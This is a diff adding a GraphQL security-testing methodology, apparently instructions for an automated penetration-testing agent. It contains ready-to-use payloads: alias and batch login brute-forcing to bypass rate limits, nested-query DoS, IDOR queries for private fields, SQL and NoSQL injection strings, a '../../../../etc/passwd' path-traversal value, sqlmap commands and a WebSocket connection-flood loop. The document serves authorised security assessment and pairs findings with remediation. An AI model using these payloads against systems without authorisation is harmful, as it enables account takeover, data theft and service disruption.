@@ -1,0 +1,146 @@
+## GraphQL Deep Security Testing Methodology
+
+### Phase 1: Introspection & Schema Extraction
+
+#### Enable/Detect Introspection
+- Send introspection query to discover full schema:
+  ```
+  POST /graphql
+  Content-Type: application/json
+  {"query": "{__schema{types{name fields{name type{name kind ofType{name}}}}}}"}
+  ```
+- Also probe alternate endpoints: `/api/graphql`, `/graphql/v1`, `/query`, `/gql`
+- `curl -s -X POST {target}/graphql -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name}}}"}' | jq .`
+- If introspection disabled, attempt field suggestion bypass:
+  ```
+  {"query": "{__type(name:\"Query\"){fields{name}}}"}
+  ```
+- Tools: `graphw00f {target}` to fingerprint GraphQL engine (Apollo, Hasura, Strawberry, etc.)
+
+#### Schema Analysis
+- Extract all types, queries, mutations, subscriptions
+- Identify sensitive fields: `password`, `token`, `secret`, `email`, `ssn`, `creditCard`
+- Map authorization-sensitive queries (user data, admin operations)
+- Look for deprecated fields still accessible
+- `python3 -c "import json; d=json.load(open('/output/graphql-schema.json')); [print(t['name']) for t in d['data']['__schema']['types'] if not t['name'].startswith('__')]"`
+
+### Phase 2: Query Depth & Complexity DoS Testing
+
+#### Depth Limit Testing
+- Test nested queries to exhaust server resources:
+  ```json
+  {"query": "{users{posts{comments{author{posts{comments{author{id}}}}}}}}"}
+  ```
+- Incrementally increase depth until error or timeout
+- Record the maximum accepted depth
+- `hey -n 10 -c 2 -m POST -H 'Content-Type: application/json' -d '{"query":"{users{posts{comments{author{posts{id}}}}}}"}' {target}/graphql`
+
+#### Complexity Limit Testing
+- Request large result sets: `{users(first:10000){id email name}}`
+- Use `__typename` in deep nesting to pad complexity
+- Test circular references if schema allows
+
+### Phase 3: Batching Attacks
+
+#### Query Batching (Array Syntax)
+- Send multiple operations in a single request:
+  ```json
+  [
+    {"query": "query A { user(id:1){email} }"},
+    {"query": "query B { user(id:2){email} }"},
+    ...repeat 100 times...
+  ]
+  ```
+- Use for brute force: batch 100 login attempts per HTTP request to bypass rate limits
+- `python3 /output/graphql_batch_brute.py --target {target}/graphql --users /wordlists/users.txt --passwords /wordlists/passwords.txt`
+
+#### Alias Batching (Rate Limit Bypass)
+- Multiple aliases in one query bypass per-query rate limits:
+  ```json
+  {"query": "{ a:login(user:\"admin\",pass:\"pass1\") b:login(user:\"admin\",pass:\"pass2\") c:login(user:\"admin\",pass:\"pass3\") }"}
+  ```
+- Generate payload: `delegate_to_coder` to write alias flood script
+
+### Phase 4: Field-Level Authorization (IDOR via Nested Queries)
+
+#### Horizontal Privilege Escalation
+- Access other users' data through nested relationships:
+  ```json
+  {"query": "{ post(id:1) { author { email phone ssn paymentMethods { cardNumber } } } }"}
+  ```
+- Test if user A can read user B's private fields through a shared resource
+- Enumerate IDs: test post IDs 1-1000 for data belonging to other users
+
+#### Vertical Privilege Escalation
+- Access admin-only fields through nested queries:
+  ```json
+  {"query": "{ me { organization { allUsers { role permissions apiKey } } } }"}
+  ```
+- Test mutations normally restricted to admins via nested objects
+
+#### Over-fetching Sensitive Data
+- Request all fields on every type and check for unintended disclosure:
+  ```json
+  {"query": "{ user(id: 1) { id username email password role apiKey createdAt deletedAt } }"}
+  ```
+
+### Phase 5: Injection via GraphQL Variables
+
+#### SQL Injection Through Variables
+- `sqlmap -u '{target}/graphql' --data='{"query":"query{user(id:FUZZ){name}}","variables":{"id":"1"}}' --level=5 -p id`
+- Manual test: `{"query":"query($id:String!){user(id:$id){name}}","variables":{"id":"1' OR '1'='1"}}`
+- NoSQL injection: `{"id": {"$gt": ""}}`
+
+#### Command Injection
+- If any field executes system commands or file operations:
+  `{"query":"query($file:String!){readFile(path:$file){content}}","variables":{"file":"../../../../etc/passwd"}}`
+
+### Phase 6: Subscription Abuse (WebSocket)
+
+#### WebSocket Connection Testing
+- Connect to GraphQL subscriptions endpoint: `wss://{target}/graphql`
+- `wscat -c wss://{target}/graphql -x '{"type":"connection_init","payload":{}}'`
+- Subscribe without authentication and check for data leakage
+- Test subscription to other users' events: `subscription { orderUpdated(userId: 2) { status items } }`
+
+#### Resource Exhaustion via Subscriptions
+- Open many concurrent WebSocket connections:
+  `for i in $(seq 1 100); do wscat -c wss://{target}/graphql & done`
+- Subscribe to high-frequency events
+
+### Phase 7: Authentication & Authorization Testing
+
+#### Unauthenticated Access
+- Remove auth headers and test all queries/mutations
+- Test queries as different user roles (guest, user, admin)
+- Check if `__schema` introspection is accessible without auth
+
+#### Token Manipulation
+- Modify JWT claims to escalate role before GraphQL requests
+- Test API key reuse across different user contexts
+
+### Phase 8: Custom Query Generation (Coder Sub-Agent)
+
+Use `delegate_to_coder` to generate:
+1. **Schema extractor**: Full introspection dump to `/output/graphql-schema.json`
+2. **Alias brute forcer**: Rate-limit bypass login script
+3. **IDOR enumerator**: Iterate IDs across all object types
+4. **Batch attacker**: Array batching exploit script
+5. **Subscription flood**: WebSocket stress tester
+
+Example delegation:
+```
+delegate_to_coder: "Write a Python script that sends GraphQL introspection query to {target}/graphql,
+saves the full schema to /output/graphql-schema.json, then generates a list of all fields
+containing 'password', 'token', 'secret', 'key', 'email' for manual review."
+```
+
+### Findings Format
+
+Report GraphQL findings with:
+- **Category**: GraphQL-Introspection / GraphQL-DoS / GraphQL-IDOR / GraphQL-Injection / GraphQL-Auth
+- **Severity**: Critical (injection/auth bypass), High (IDOR, unrestricted introspection), Medium (DoS, excessive data)
+- **Evidence**: Query sent, response received, sensitive data exposed
+- **Remediation**: Disable introspection in production, enforce query depth/complexity limits, field-level auth, per-operation rate limits
+- **CWE**: CWE-200 (info disclosure), CWE-284 (improper access control), CWE-400 (resource exhaustion)
+- **OWASP**: API3:2023 Broken Object Property Level Auth, API4:2023 Unrestricted Resource Consumption
